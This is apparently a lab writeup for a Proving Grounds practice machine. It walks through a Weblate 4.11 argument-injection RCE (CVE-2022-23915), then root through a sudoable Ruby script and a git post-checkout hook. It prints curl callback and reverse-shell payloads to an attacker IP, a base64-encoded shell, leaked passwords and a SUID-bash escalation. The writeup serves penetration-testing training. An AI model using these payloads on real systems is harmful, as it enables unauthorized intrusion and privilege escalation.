---
title: Fikklish — Proving Grounds Practice Writeup
date: 2026-10-19 14:00:00 +0800
categories: [OSCP, Proving Grounds]
tags: [oscp, proving-grounds, weblate, cve-2022-23915, mercurial, sudo, git-hooks, linux]
description: >-
  Walkthrough of the Fikklish Proving Grounds Practice machine — a Weblate 4.11
  argument injection (CVE-2022-23915) that lands as the tom OS user, credential
  reuse from .psql_history, and root through a sudoable Ruby script plus a git
  post-checkout hook.
render_with_liquid: false
---

# Fikklish — PG Practice

## Target

- **IP:** 192.168.232.19
- **OS:** Ubuntu 22.04 (Linux kernel 5.15)
- **Difficulty:** Easy — 10 points
- **Attacker IP (tun0):** 192.168.45.249
- **Hostname:** fikklish
- **Entry point:** Weblate 4.11 on port 8000

## Summary

Port 8000 runs Weblate 4.11, which is vulnerable to CVE-2022-23915: a payload
placed in the **Repository branch** field is passed into the Mercurial command
line and executed. The RCE fired during the component's repository validation,
and the callback came back as the `tom` OS account — Weblate runs as that user.
Inside tom's home, `.psql_history` held the database passwords, and the same
password worked for `sudo`. `tom` may sudo `/home/tom/checkout.rb`, a Ruby
script that runs `git init` and `git checkout` inside a directory tom controls.
A `post-checkout` hook therefore executed as root.

## Attack path

1. Port 80 — Book Bargains, the theme of the box (book authors).
2. Port 8000 — Weblate 4.11. Version banner → CVE-2022-23915.
3. Create a component with a payload in the **Repository branch** field.
4. Weblate validates the repository → the payload executes as `tom`.
5. Read `/home/tom/.psql_history` → database passwords → reuse for `sudo`.
6. `sudo /home/tom/checkout.rb` + `post-checkout` hook → root.

---

## 1.0 Reconnaissance

![](/assets/img/posts/fikklish/01-recon-sweep.png)

```bash
echo 192.168.232.19 > targets.txt
sudo $(which corvid-sweep) -i targets.txt
```

`corvid-sweep` runs two passes: discovery across all targets, then version
detection on the ports that answered. Report lands in
`corvid-sweep-output/corvid-sweep-YYYYMMDD-N/report.txt`.

Tool: https://github.com/0xs4h4/corvid

| Port | Proto | Service | Version |
|------|-------|---------|---------|
| 22 | tcp | ssh | OpenSSH 8.9p1 Ubuntu 3 |
| 80 | tcp | http | Apache httpd 2.4.52 (Ubuntu) — "Book Bargains Online" |
| 8000 | tcp | http | WSGIServer 0.2 / CPython 3.10.12 — Weblate |

Notes:

- Three ports. Port 8000 is the interesting one: a second web app on a
  non-standard port.
- Port 80 is a normal Apache site. Port 8000 is a Python WSGI app.
- Version detection matters here. The Weblate banner leads straight to the CVE.

## 2.0 Enumeration

### 2.1 Port 80 — Book Bargains Online

![](/assets/img/posts/fikklish/02-bookstore.png)

```bash
whatweb http://192.168.232.19
curl -s http://192.168.232.19/robots.txt
feroxbuster -u http://192.168.232.19 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

The page is a bookstore: "Your one-stop shop for all your reading needs". No
login, no obvious application logic. It sets the **theme**: this box is about
book authors.

That matters later. The box's credentials come from that theme.

### 2.2 Port 8000 — Weblate

![](/assets/img/posts/fikklish/03-weblate-8000.png)

```bash
curl -s http://192.168.232.19:8000/ | grep -i -E "version|weblate"
curl -s http://192.168.232.19:8000/robots.txt
```

![](/assets/img/posts/fikklish/04-weblate-robots.png)

- Footer banner: **Weblate 4.11**.
- `robots.txt` lists 31 disallowed paths: `/admin/`, `/accounts/`, `/source/`,
  `/commit/`, `/push/`, `/update/`, `/reset/`, `/changes/`, `/search/`,
  `/replace/` and more.
- `robots.txt` is a hint, not a control.

![](/assets/img/posts/fikklish/05-weblate-login.png)

A login page is exposed. That is the gate: CVE-2022-23915 needs an account with
permission to create projects and components.

### 2.3 Version → vulnerability

Weblate `>= 0, < 4.11.1` is affected by **CVE-2022-23915** — argument injection
in the repository branch field.

- Snyk ID: `SNYK-PYTHON-WEBLATE-2414088`
- CVSS 8.8
- Public PoC exists
- Requires an authenticated account that can create a component

The blocker is not the exploit. The blocker is the login.

> How the Weblate admin account was obtained on this instance is the one step the
> public writeups only show as screenshots. What matters for the rest of this
> note is that an account with component-creation rights is enough, and that the
> exploit then lands as the `tom` OS user.

## 3.0 Foothold — CVE-2022-23915

![](/assets/img/posts/fikklish/06-weblate-create-project.png)

Create a project first: **Admin → Projects → Add**.

| Field | Value |
|-------|-------|
| Project name | `final test` |
| URL slug | `final-test` |
| Project website | `http://192.168.232.19:8000` |
| Access control | public (default) |

Press **Save**. You land on the empty project page.

### 3.1 Create the component

![](/assets/img/posts/fikklish/07-weblate-component.png)

**Add component → From version control.** On this build the form is a single
page.

| Field                  | Value                                             |
| ---------------------- | ------------------------------------------------- |
| Component name         | `final`                                           |
| URL slug               | `final`                                           |
| Project                | `final test`                                      |
| Source language        | English                                           |
| Version control system | **Mercurial**                                     |
| Source code repository | `http://localhost:8000`                           |
| Repository branch      | `--config=alias.pull=!curl http://192.168.45.249` |

Fill in the form above, then start the listener. Do it before pressing
Continue, because the payload fires the moment you click it:

```bash
nc -lvnp 80
```

Now press **Continue**. Weblate validates the repository immediately, and the
payload executes during that validation. If nothing is listening, the command
still runs but dies silently.

The callback that arrives is the result of
`--config=alias.pull=!curl http://192.168.45.249`:

```
connect to [192.168.45.249] from (UNKNOWN) [192.168.232.19] 45292
GET / HTTP/1.1
Host: 192.168.45.249
User-Agent: curl/7.81.0
Accept: */*
```

![](/assets/img/posts/fikklish/08-rce-confirmed.png)

### 3.2 From callback to shell

The `curl` callback only proves execution. Once it is confirmed, swap the
payload for a reverse shell on the same component.

**1. Listener:**

```bash
nc -lvnp 80
```

**2. Change `Repository branch` to the reverse shell.** Direct form:

```
--config=alias.pull=!bash -c 'bash -i >& /dev/tcp/192.168.45.249/80 0>&1'
```

If the quoting gets mangled by the form, use the base64 form — it is one
argument with no quotes to break:

```
--config=alias.pull=!bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjQ5LzgwIDA+JjEK | base64 -d | bash"
```

**3. Save / Continue** — the same validation path fires, and this time the
shell connects back:

```
connect to [192.168.45.249] from (UNKNOWN) [192.168.232.19] 51280
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
```

The shell runs as **`tom`**, not `weblate`:

```
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),30(dip),
46(plugdev),110(lxd)
```

![](/assets/img/posts/fikklish/09-shell-tom.png)

It is a raw socket shell: no TTY, no job control, and `!` triggers bash history
expansion. Fix both before doing anything else:

```bash
set +H
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 4.0 Credentials — `.psql_history`

The shell lands as `tom`, and Weblate is installed under that user. Its database
history is readable:

```bash
cat /home/tom/.psql_history
```

```
GRANT ALL PRIVILEGES ON DATABASE WEBLATE to WEBLATE;
ALTER USER WEBLATE PASSWORD 'RapidlyLockstepDrenched103';
\q
ALTER USER WEBLATE PASSWORD 'RollingShockingLifter231';
\q
```

Both are candidate passwords. The first one is also tom's OS password — password
reuse between the database account and the system account.

## 5.0 Privilege escalation — sudo checkout.rb


```bash
printf '#!/bin/sh\necho RapidlyLockstepDrenched103\n' > /tmp/ap.sh
chmod +x /tmp/ap.sh
SUDO_ASKPASS=/tmp/ap.sh sudo -A -l
```

```
User tom may run the following commands on fikklish:
    (ALL) /home/tom/checkout.rb
    (ALL) /home/tom/fetch.rb
```

`SUDO_ASKPASS` is used because the nc shell has no TTY; `sudo -S` and an
interactive prompt both fail there.

### 5.1 Read the sudoable script


```bash
cat /home/tom/checkout.rb
```

```ruby
#!/usr/bin/ruby

require 'git'

puts "Name of the project: "
name = gets
g = Git.init('/root/projects/' + name.chomp)

puts "Location of branch: "
branch = gets
g.checkout(branch.chomp)
```

Two problems:

1. `name` is concatenated into a path with no validation, so
   `../../home/tom/pwn` escapes `/root/projects` into a directory tom owns.
2. `git checkout` runs in that directory, and git runs
   `.git/hooks/post-checkout` after a successful checkout — as root.

`fetch.rb` has the same shape, with `git fetch` and an attacker-controlled
origin and ref.

### 5.2 Exploit

```bash
rm -rf /home/tom/pwn
mkdir -p /home/tom/pwn/.git/hooks
cd /home/tom/pwn
git init -q
echo x > x
git add .
git -c user.email=a@b -c user.name=a commit -qm x

printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\n' \
  > /home/tom/pwn/.git/hooks/post-checkout
chmod +x /home/tom/pwn/.git/hooks/post-checkout

printf '../../home/tom/pwn\nmaster\n' | \
  SUDO_ASKPASS=/tmp/ap.sh sudo -A /home/tom/checkout.rb
```

The hook copies bash and sets the SUID bit as root.


```bash
/tmp/rootbash -p -c 'id'
```

```
uid=1000(tom) gid=1000(tom) euid=0(root) egid=0(root)
```

## 6.0 Flags

```bash
/tmp/rootbash -p -c 'cat /home/tom/local.txt; cat /root/proof.txt'
```


- **local.txt:** `5b7c02e89609c3c24f3bc39a6b27d4c5`
- **proof.txt:** `3d480bb907f2715132ca8172f6cbf94c`

## 7.0 Loot

- **`tom` OS password:** `RapidlyLockstepDrenched103`
- **Weblate DB password:** `RapidlyLockstepDrenched103` /
  `RollingShockingLifter231` (both appear in `.psql_history`)
- **sudo rights:** `checkout.rb`, `fetch.rb` (ALL, need password)
- **Groups of note:** `tom` is in `lxd` — an alternative root path if images are
  available (`lxc list` works, no images on this box)
- **Files:** `/home/tom/checkout.rb`, `/home/tom/fetch.rb`,
  `/home/tom/.psql_history`

## 8.0 Lessons

- **Version banners are leverage.** The Weblate footer gave 4.11, which is
  enough to find a public RCE. Check the footer, not just the HTTP headers.
- **VCS choice decides the exploit.** The same payload works on Mercurial and
  fails on Git, because Weblate passes the branch differently for each backend.
- **Read the sudoable script, do not guess.** `checkout.rb` looked like a
  harmless helper; the path concatenation and the `git checkout` are the whole
  bug.
- **Credential reuse is the shortest hop.** `.psql_history` gave a database
  password that was also the system password. Look at shell history files first.
- **No TTY, no sudo.** A raw nc shell cannot answer a sudo prompt. `SUDO_ASKPASS`
  is the fix; `sudo -S` fails when stdin is the socket.

## 9.0 References

- Snyk — SNYK-PYTHON-WEBLATE-2414088 / CVE-2022-23915, with the argument
  injection PoC
- Weblate docs 4.11 — project and component configuration (file mask, file
  format)
- Git — `post-checkout` hook runs as the invoking process user
- corvid-sweep — https://github.com/0xs4h4/corvid (own recon tool)

---

## Appendix — Why this works

Weblate's Mercurial backend builds the pull command from the branch field:

```python
# weblate/vcs/mercurial.py, 4.11
def update_remote(self):
    self.execute(["pull", "--branch", self.branch])
```

So the argv becomes:

```
hg pull --branch "--config=alias.pull=!curl http://192.168.45.249"
```

Two Mercurial behaviours make that dangerous:

1. `--config` is an **early global option**. Mercurial parses it anywhere on the
   command line, even where `--branch` expects its value.
2. An alias named `pull` **overrides the built-in command**, so hg runs the
   shell command after `!` instead of pulling.

The fix in 4.11.1 is one character of intent:

```python
# 4.11.1
self.execute(["pull", f"--branch={self.branch}"])
```

The `=` form stops the payload from being read as a separate option.

### Why Git does not work

The git backend puts the branch inside a refspec:

```python
refspec = f"{self.branch}:{branch}"     # +refs/heads/--config=...:refs/remotes/...
```

The payload becomes one long refspec string, so git never parses it as an
option. The attempt fails with
`fatal: invalid refspec '+refs/heads/--config=alias.pull=!...'`.

Mercurial is the only VCS path that works for this CVE in 4.11.

### Why the sudo script is root

`Git.init('/root/projects/' + name)` builds a path from unvalidated input.
`../../home/tom/pwn` resolves back into tom's home. `git checkout` in a
repository tom controls runs tom's `post-checkout` hook, and the process is
already root because it came through sudo.
